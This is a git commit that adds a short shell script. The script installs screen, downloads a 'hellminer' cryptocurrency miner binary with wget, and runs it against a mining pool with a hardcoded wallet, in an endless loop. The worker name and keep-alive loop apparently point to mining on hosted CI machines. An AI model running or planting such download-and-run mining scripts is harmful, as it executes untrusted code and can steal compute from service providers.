07ef956ff103f3bf86bcabe9c0c4ca553fed5f05
radin03 <95596112+radin03@users.noreply.github.com>
2021-12-20 22:37:57 +0700

    Add files via upload

---
+++ hell.sh
@@ -0,0 +1,10 @@
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz
+./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u R9eMwXF6UeyRV1HRQ1JRMMZjn44pAHN8yq.buhtig -p c=RVN,mc=VRSC x --cpu 4
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
